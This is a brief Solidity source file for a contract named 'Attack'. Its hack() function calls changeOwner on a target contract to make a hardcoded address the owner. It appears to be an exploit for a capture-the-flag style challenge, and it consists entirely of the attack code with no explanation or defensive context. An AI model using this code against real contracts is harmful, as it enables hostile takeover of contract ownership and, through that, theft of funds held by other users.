//SPDX-License-Identifier: MIT
pragma solidity 0.8.0;

contract Attack {
    address public target;
    address OWNER = 0x5E5B6cF47eC2C3B284eC1B05cb8Da021E00fdaE5;

    constructor(address _target){
        target = _target;
    }

    function hack() public {
    (bool success,) = target.call(abi.encodeWithSignature("changeOwner(address)", OWNER));
    require(success);
    }
}